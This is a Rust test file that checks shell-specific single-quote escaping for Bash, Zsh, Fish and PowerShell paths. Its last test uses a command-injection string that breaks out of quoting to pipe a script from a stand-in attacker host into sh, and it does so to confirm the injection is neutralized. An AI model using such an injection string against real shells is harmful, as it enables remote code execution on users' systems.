use crate::terminal::shell::ShellType;

use super::shell_escape_single_quotes;

#[test]
fn no_quotes_returns_input_unchanged() {
    for shell_type in [
        ShellType::Bash,
        ShellType::Zsh,
        ShellType::Fish,
        ShellType::PowerShell,
    ] {
        assert_eq!(
            shell_escape_single_quotes("/home/user/histfile", shell_type),
            "/home/user/histfile"
        );
    }
}

#[test]
fn bash_escapes_single_quote_with_concatenation() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Bash);
    assert_eq!(result, r#"it'"'"'s a test"#);
}

#[test]
fn zsh_escapes_single_quote_with_concatenation() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Zsh);
    assert_eq!(result, r#"it'"'"'s a test"#);
}

#[test]
fn fish_escapes_single_quote_with_backslash() {
    let result = shell_escape_single_quotes("it's a test", ShellType::Fish);
    assert_eq!(result, r"it\'s a test");
}

#[test]
fn powershell_escapes_single_quote_by_doubling() {
    let result = shell_escape_single_quotes("it's a test", ShellType::PowerShell);
    assert_eq!(result, "it''s a test");
}

#[test]
fn multiple_single_quotes_all_escaped() {
    let input = "/home/user/it's a 'path'";

    let bash = shell_escape_single_quotes(input, ShellType::Bash);
    assert_eq!(bash.matches(r#"'"'"'"#).count(), 3);

    let fish = shell_escape_single_quotes(input, ShellType::Fish);
    assert_eq!(fish.matches(r"\'").count(), 3);

    let ps = shell_escape_single_quotes(input, ShellType::PowerShell);
    assert_eq!(ps.matches("''").count(), 3);
}

/// A path containing embedded single quotes that attempt to break out of a
/// surrounding single-quoted context (e.g. `cat '...'` or `cd '...'`).
/// Every shell type must neutralize the quotes so the injected commands
/// remain inert literal text.
#[test]
fn command_injection_via_embedded_quotes_is_neutralized() {
    let malicious = "/tmp/foo'; curl http://evil.com | sh; echo '";

    let bash = shell_escape_single_quotes(malicious, ShellType::Bash);
    assert_eq!(bash.matches(r#"'"'"'"#).count(), 2);
    assert!(
        !bash.contains(r"\'"),
        "bash escaping should not use backslash-quote"
    );

    let fish = shell_escape_single_quotes(malicious, ShellType::Fish);
    assert_eq!(fish.matches(r"\'").count(), 2);

    let ps = shell_escape_single_quotes(malicious, ShellType::PowerShell);
    assert_eq!(ps.matches("''").count(), 2);
}
